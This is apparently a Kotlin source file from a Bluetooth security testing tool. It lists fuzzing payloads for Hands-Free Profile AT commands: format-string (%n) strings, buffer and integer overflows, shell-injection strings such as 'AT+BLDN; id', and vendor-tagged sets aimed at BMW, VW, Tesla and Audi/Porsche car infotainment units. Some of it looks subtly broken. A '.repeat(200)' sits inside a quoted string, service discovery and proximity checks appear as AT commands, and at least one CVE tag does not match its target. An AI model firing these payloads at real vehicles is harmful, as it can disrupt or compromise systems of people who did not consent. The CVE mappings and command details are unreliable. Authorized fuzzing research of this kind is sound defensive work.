/*
 * Bluetooth Security Testing Tool
 * Copyright (c) 2026 Security Research Team
 *
 * Licensed under MIT with additional restrictions:
 * - This application may ONLY be used for AUTHORIZED security testing
 * - See LICENSE for full terms
 */
package com.btsec.testtool.data.fuzzing

import com.btsec.testtool.domain.model.FuzzingCategory
import com.btsec.testtool.domain.model.FuzzingPattern
import com.btsec.testtool.domain.model.FuzzingSeverity

/**
 * Fuzzing patterns specific to HFP (Hands-Free Profile) AT command injection.
 *
 * These patterns test for:
 * - Format string vulnerabilities (CVE-2020-16142)
 * - Buffer overflows
 * - Command injection
 * - Boundary violations
 *
 * Based on known vulnerabilities in automotive Bluetooth stacks.
 */
object HfpFuzzingPatterns {
    /**
     * Format string patterns - CVE-2020-16142 (Mercedes NTG5)
     *
     * Tests for improper handling of format specifiers in AT commands.
     * Vulnerable systems may leak memory or crash when processing these.
     */
    val formatStringPatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-FMT-001",
                name = "Format String - %x",
                category = FuzzingCategory.AT_INJECTION,
                severity = FuzzingSeverity.HIGH,
                description = "Hex format specifier - potential memory leak",
                payloads =
                    listOf(
                        "AT+BTRH=%x%x%x%x%x",
                        "AT+CLCC=%x%x%x%x%x",
                        "AT+CMGS=%x%x%x%x%x",
                        "AT+BLDN%x%x%x%x%x",
                    ),
                cveReferences = listOf("CVE-2020-16142"),
            ),
            FuzzingPattern(
                id = "HFP-FMT-002",
                name = "Format String - %s",
                category = FuzzingCategory.AT_INJECTION,
                severity = FuzzingSeverity.HIGH,
                description = "String format specifier - potential crash",
                payloads =
                    listOf(
                        "AT+BTRH=%s%s%s%s",
                        "AT+CLCC=%s%s%s%s",
                        "AT+CMGS=%s%s%s%s",
                    ),
                cveReferences = listOf("CVE-2020-16142"),
            ),
            FuzzingPattern(
                id = "HFP-FMT-003",
                name = "Format String - %n",
                category = FuzzingCategory.AT_INJECTION,
                severity = FuzzingSeverity.CRITICAL,
                description = "Write specifier - potential arbitrary write",
                payloads =
                    listOf(
                        "AT+BTRH=%n%n%n%n",
                        "AT+CLCC=%n%n%n%n",
                    ),
                cveReferences = listOf("CVE-2020-16142"),
            ),
            FuzzingPattern(
                id = "HFP-FMT-004",
                name = "Format String - Combined",
                category = FuzzingCategory.AT_INJECTION,
                severity = FuzzingSeverity.HIGH,
                description = "Mixed format specifiers",
                payloads =
                    listOf(
                        "AT+BTRH=%x%s%n%x",
                        "AT+CLCC=%s%x%n%s",
                        "AT+CMGS=%n%x%s%x%n",
                    ),
                cveReferences = listOf("CVE-2020-16142"),
            ),
        )

    /**
     * Buffer overflow patterns
     *
     * Tests for lack of input validation on AT command length and parameters.
     */
    val bufferOverflowPatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-OVF-001",
                name = "Long AT Command",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "Overlong AT command string",
                payloads =
                    listOf(
                        "AT+" + "A".repeat(1000),
                        "AT+" + "A".repeat(5000),
                        "AT+CLCC=" + "A".repeat(1000),
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-OVF-002",
                name = "Repeated Parameter",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "AT command with excessive repeated parameters",
                payloads =
                    listOf(
                        "AT+BTRH=" + "1,".repeat(100),
                        "AT+CLCC=" + "0,".repeat(200),
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-OVF-003",
                name = "Nested Parameters",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "Deeply nested AT command parameters",
                payloads =
                    listOf(
                        "AT+CMGS=" + "(" + "A" + ",".repeat(50) + ")",
                        "AT+BLDN=" + "(".repeat(20) + ")".repeat(20),
                    ),
                cveReferences = listOf(),
            ),
        )

    /**
     * Command injection patterns
     *
     * Tests for improper separation of AT commands.
     */
    val commandInjectionPatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-INJ-001",
                name = "Semicolon Separator",
                category = FuzzingCategory.COMMAND_INJECTION,
                severity = FuzzingSeverity.HIGH,
                description = "Multiple AT commands via semicolon",
                payloads =
                    listOf(
                        "AT+CLCC;ATD1234567890",
                        "AT+BTRH;AT+CLCC",
                        "AT+BLDN;AT+CMGS",
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-INJ-002",
                name = "Shell Command Injection",
                category = FuzzingCategory.COMMAND_INJECTION,
                severity = FuzzingSeverity.CRITICAL,
                description = "Shell escape sequences",
                payloads =
                    listOf(
                        "AT+CLCC && shell",
                        "AT+BTRH | cmd",
                        "AT+BLDN; id",
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-INJ-003",
                name = "Escape Sequence Injection",
                category = FuzzingCategory.COMMAND_INJECTION,
                severity = FuzzingSeverity.MEDIUM,
                description = "ANSI escape sequences",
                payloads =
                    listOf(
                        "AT+CLCC\u001b[2J",
                        "AT+BTRH\u001b[H",
                        "AT+BLDN\u001b[0m",
                    ),
                cveReferences = listOf(),
            ),
        )

    /**
     * Boundary violation patterns
     *
     * Tests for integer overflow and boundary conditions.
     */
    val boundaryViolationPatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-BND-001",
                name = "Negative Integer",
                category = FuzzingCategory.INTEGER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "Negative values in numeric AT parameters",
                payloads =
                    listOf(
                        "AT+CLCC=-1",
                        "AT+BTRH=-99999",
                        "AT+CMGS=-2147483648",
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-BND-002",
                name = "Integer Overflow",
                category = FuzzingCategory.INTEGER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "Maximum integer values",
                payloads =
                    listOf(
                        "AT+CLCC=2147483647",
                        "AT+BTRH=4294967295",
                        "AT+CMGS=999999999999999",
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-BND-003",
                name = "Zero Value",
                category = FuzzingCategory.INTEGER_OVERFLOW,
                severity = FuzzingSeverity.LOW,
                description = "Zero and null boundary conditions",
                payloads =
                    listOf(
                        "AT+CLCC=0",
                        "AT+BTRH=00",
                        "AT+CMGS=",
                    ),
                cveReferences = listOf(),
            ),
        )

    /**
     * HFP-specific command patterns
     *
     * Tests for vulnerabilities in standard HFP AT commands.
     */
    val hfpCommandPatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-CMD-001",
                name = "BLDN (Last Number Redial)",
                category = FuzzingCategory.HFP_COMMAND,
                severity = FuzzingSeverity.MEDIUM,
                description = "Test BLDN command with malformed input",
                payloads =
                    listOf(
                        "AT+BLDN",
                        "AT+BLDN=",
                        "AT+BLDN=%x%x%x",
                        "AT+BLDN;ATD0000",
                    ),
                cveReferences = listOf("CVE-2020-16142"),
            ),
            FuzzingPattern(
                id = "HFP-CMD-002",
                name = "CLCC (List Current Calls)",
                category = FuzzingCategory.HFP_COMMAND,
                severity = FuzzingSeverity.MEDIUM,
                description = "Test CLCC command for injection",
                payloads =
                    listOf(
                        "AT+CLCC",
                        "AT+CLCC=?",
                        "AT+CLCC=%s%s%s",
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-CMD-003",
                name = "BRSF (Bluetooth Retrieve Supported Features)",
                category = FuzzingCategory.HFP_COMMAND,
                severity = FuzzingSeverity.MEDIUM,
                description = "Test BRSF with overflow values",
                payloads =
                    listOf(
                        "AT+BRSF=999999",
                        "AT+BRSF=%n",
                        "AT+BRSF=" + "9".repeat(100),
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-CMD-004",
                name = "CIND (Indicator Update)",
                category = FuzzingCategory.HFP_COMMAND,
                severity = FuzzingSeverity.MEDIUM,
                description = "Test CIND indicator manipulation",
                payloads =
                    listOf(
                        "AT+CIND?",
                        "AT+CIND=%x",
                        "AT+CIND=" + "1,".repeat(50),
                    ),
                cveReferences = listOf(),
            ),
            FuzzingPattern(
                id = "HFP-CMD-005",
                name = "CMGS (Send Message)",
                category = FuzzingCategory.HFP_COMMAND,
                severity = FuzzingSeverity.HIGH,
                description = "Test CMGS for SMS injection",
                payloads =
                    listOf(
                        "AT+CMGS=" + "A".repeat(1000),
                        "AT+CMGS=%x%x%x",
                        "AT+CMGS;ATD0000",
                    ),
                cveReferences = listOf(),
            ),
        )

    // ── Vendor-specific patterns ──

    /**
     * BMW HU_NBT patterns - CVE-2018-9313
     *
     * Tests for unauthorized RFCOMM channel access and AT command injection
     * on BMW HU_NBT infotainment (BMW i/X/3/5/7 Series 2010-2018).
     * The HU_NBT accepts AT commands over RFCOMM without proper auth checks.
     */
    val bmwHuNbtPatterns =
        listOf(
            FuzzingPattern(
                id = "HFP-BMW-001",
                name = "BMW HU_NBT - Unauthorized RFCOMM AT+NREC",
                category = FuzzingCategory.AT_INJECTION,
                severity = FuzzingSeverity.CRITICAL,
                description = "Test noise reduction command injection on BMW HU_NBT (CVE-2018-9313)",
                payloads =
                    listOf(
                        "AT+NREC=2",
                        "AT+NREC=99",
                        "AT+NREC=%s%s%s",
                        "AT+NREC=\"A\".repeat(200)",
                    ),
                cveReferences = listOf("CVE-2018-9313"),
            ),
            FuzzingPattern(
                id = "HFP-BMW-002",
                name = "BMW HU_NBT - Bluetooth Access Code",
                category = FuzzingCategory.HFP_COMMAND,
                severity = FuzzingSeverity.HIGH,
                description = "Test BTAC manipulation on BMW HU_NBT",
                payloads =
                    listOf(
                        "AT+BTAC=00:00:00:00:00:00",
                        "AT+BTAC=FF:FF:FF:FF:FF:FF",
                        "AT+BTAC=01:02:03:04:05:06",
                        "AT+BTAC=" + "FF:".repeat(50),
                    ),
                cveReferences = listOf("CVE-2018-9313"),
            ),
            FuzzingPattern(
                id = "HFP-BMW-003",
                name = "BMW HU_NBT - Volume Overflow",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.HIGH,
                description = "Test volume control overflow on BMW HU_NBT",
                payloads =
                    listOf(
                        "AT+VGS=255",
                        "AT+VGS=9999",
                        "AT+VGS=" + "9".repeat(100),
                        "AT+VGM=255",
                        "AT+VGM=-255",
                    ),
                cveReferences = listOf("CVE-2018-9313"),
            ),
            FuzzingPattern(
                id = "HFP-BMW-004",
                name = "BMW HU_NBT - Indicators Overflow",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "Test indicator update with malformed values on BMW HU_NBT",
                payloads =
                    listOf(
                        "AT+CIND=?(255)",
                        "AT+CIND=?(999)",
                        "AT+CIND=0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
                    ),
                cveReferences = listOf("CVE-2018-9313"),
            ),
        )

    /**
     * VW MIB3 patterns - CVE-2023-28908 through CVE-2023-28911
     *
     * Tests for SDP buffer overflow, RFCOMM input validation failures,
     * and authentication bypass on VW MIB3 infotainment (VW/Audi/Skoda/SEAT).
     */
    val vwMib3Patterns =
        listOf(
            FuzzingPattern(
                id = "HFP-VW-001",
                name = "VW MIB3 - SDP Service Search Overflow",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.CRITICAL,
                description = "Test SDP service search with oversized UUID patterns (CVE-2023-28908)",
                payloads =
                    listOf(
                        "AT+SDP=FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF",
                        "AT+SDP=" + "A".repeat(500),
                        "AT+SDP=0000110A-0000-1000-8000-00805F9B34FB" + "A".repeat(200),
                    ),
                cveReferences = listOf("CVE-2023-28908"),
            ),
            FuzzingPattern(
                id = "HFP-VW-002",
                name = "VW MIB3 - RFCOMM Null Injection",
                category = FuzzingCategory.COMMAND_INJECTION,
                severity = FuzzingSeverity.HIGH,
                description = "Test RFCOMM channel with null bytes and special chars (CVE-2023-28909)",
                payloads =
                    listOf(
                        "AT+CMEE=2\u0000\u0000\u0000",
                        "AT+CIND?\u0000\u0001\u0002\u0003",
                        "AT+CLIP:\u0000\u00FF\u00FF\u00FF\u00FF",
                    ),
                cveReferences = listOf("CVE-2023-28909"),
            ),
            FuzzingPattern(
                id = "HFP-VW-003",
                name = "VW MIB3 - Unauthenticated HFP Connect",
                category = FuzzingCategory.AT_INJECTION,
                severity = FuzzingSeverity.CRITICAL,
                description = "Test HFP connection without pairing (CVE-2023-28910)",
                payloads =
                    listOf(
                        "AT+BRSF=0",
                        "AT+CIND=?",
                        "AT+CMER=3,0,0,1",
                        "AT+CLIP=1",
                        "AT+CCWA=1",
                    ),
                cveReferences = listOf("CVE-2023-28910"),
            ),
            FuzzingPattern(
                id = "HFP-VW-004",
                name = "VW MIB3 - PBAP Unauthenticated Access",
                category = FuzzingCategory.AT_INJECTION,
                severity = FuzzingSeverity.CRITICAL,
                description = "Test PBAP phonebook access without pairing (CVE-2023-28911)",
                payloads =
                    listOf(
                        "AT+CPBS=\"MC\"",
                        "AT+CPBR=1",
                        "AT+CPBR=1,999",
                        "AT+CPBR=0,0,\"\"",
                    ),
                cveReferences = listOf("CVE-2023-28910", "CVE-2023-28911"),
            ),
        )

    /**
     * Tesla MCU/MMC2 patterns - CVE-2020-9395, CVE-2020-9396
     *
     * Tests for Bluetooth stack vulnerabilities in Tesla Model S/3/X/Y
     * infotainment. These CVEs cover authentication bypass and information
     * disclosure via Bluetooth proximity.
     */
    val teslaMcuParam =
        listOf(
            FuzzingPattern(
                id = "HFP-TESLA-001",
                name = "Tesla MCU - Proximity Auth Bypass",
                category = FuzzingCategory.AT_INJECTION,
                severity = FuzzingSeverity.CRITICAL,
                description = "Test proximity-based authentication bypass attempt (CVE-2020-9395)",
                payloads =
                    listOf(
                        "AT+PROX=1",
                        "AT+PROX=0",
                        "AT+PROX=255",
                        "AT+PROX=%s%s%s%s",
                    ),
                cveReferences = listOf("CVE-2020-9395"),
            ),
            FuzzingPattern(
                id = "HFP-TESLA-002",
                name = "Tesla MCU - Device Info Disclosure",
                category = FuzzingCategory.HFP_COMMAND,
                severity = FuzzingSeverity.HIGH,
                description = "Test information disclosure via AT commands (CVE-2020-9396)",
                payloads =
                    listOf(
                        "AT+GMI",
                        "AT+GMM",
                        "AT+GMR",
                        "AT+CGMI",
                        "AT+CGMM",
                        "AT+CGMR",
                        "AT+CGSN",
                    ),
                cveReferences = listOf("CVE-2020-9396"),
            ),
            FuzzingPattern(
                id = "HFP-TESLA-003",
                name = "Tesla MCU - Phone Status Overflow",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.HIGH,
                description = "Test phone status report with overflow values",
                payloads =
                    listOf(
                        "AT+COPS?",
                        "AT+CREG=2",
                        "AT+CSQ=99,99",
                        "AT+CBC=99,99",
                    ),
                cveReferences = listOf("CVE-2020-9396"),
            ),
            FuzzingPattern(
                id = "HFP-TESLA-004",
                name = "Tesla MCU - DTMF Injection",
                category = FuzzingCategory.COMMAND_INJECTION,
                severity = FuzzingSeverity.HIGH,
                description = "Test DTMF tone injection for call manipulation",
                payloads =
                    listOf(
                        "AT+VTS=0,1,2,3,4,5,6,7,8,9,*,#",
                        "AT+VTS=" + "0,1,2,3,4,5,6,7,8,9,".repeat(20),
                        "AT+VTS=**,##,%%",
                    ),
                cveReferences = listOf("CVE-2020-9396"),
            ),
        )

    /**
     * Porsche/Audi MMI patterns
     *
     * Tests for infotainment vulnerabilities in VW Group premium brands
     * that use Audi MMI / Porsche PCM infotainment ECUs (Bosch-based).
     */
    val porscheAudiParam =
        listOf(
            FuzzingPattern(
                id = "HFP-PA-001",
                name = "Porsche/Audi MMI - NREC Command Overflow",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.HIGH,
                description = "Test noise reduction command overflow on Audi MMI",
                payloads =
                    listOf(
                        "AT+NREC=2",
                        "AT+NREC=-1",
                        "AT+NREC=" + "1".repeat(500),
                    ),
                cveReferences = listOf("CVE-2019-13924"),
            ),
            FuzzingPattern(
                id = "HFP-PA-002",
                name = "Porsche/Audi MMI - Microphone Control",
                category = FuzzingCategory.HFP_COMMAND,
                severity = FuzzingSeverity.MEDIUM,
                description = "Test microphone gain manipulation on Audi MMI",
                payloads =
                    listOf(
                        "AT+VGM=255",
                        "AT+VGM=-255",
                        "AT+VGS=15",
                        "AT+VGS=255",
                        "AT+VGM=" + "9".repeat(100),
                    ),
                cveReferences = listOf("CVE-2019-13924"),
            ),
            FuzzingPattern(
                id = "HFP-PA-003",
                name = "Porsche/Audi MMI - Call Waiting Buffer",
                category = FuzzingCategory.BUFFER_OVERFLOW,
                severity = FuzzingSeverity.MEDIUM,
                description = "Test call waiting number with long input",
                payloads =
                    listOf(
                        "AT+CCWA=1,0,1,\"+1" + "9".repeat(200) + "\"",
                        "AT+CLCC",
                        "AT+CLIP=\"+1" + "8".repeat(300) + "\",129",
                    ),
                cveReferences = listOf("CVE-2019-13924", "CVE-2021-26411"),
            ),
        )

    /**
     * Get all HFP fuzzing patterns.
     */
    fun allPatterns(): List<FuzzingPattern> =
        listOf(
            formatStringPatterns,
            bufferOverflowPatterns,
            commandInjectionPatterns,
            boundaryViolationPatterns,
            hfpCommandPatterns,
            bmwHuNbtPatterns,
            vwMib3Patterns,
            teslaMcuParam,
            porscheAudiParam,
        ).flatten()

    /**
     * Get patterns by category.
     */
    fun byCategory(category: FuzzingCategory): List<FuzzingPattern> = allPatterns().filter { it.category == category }

    /**
     * Get patterns by severity.
     */
    fun bySeverity(severity: FuzzingSeverity): List<FuzzingPattern> =
        allPatterns().filter { it.severity == severity }

    /**
     * Get patterns with CVE references.
     */
    fun withCveReferences(): List<FuzzingPattern> = allPatterns().filter { it.cveReferences.isNotEmpty() }
}
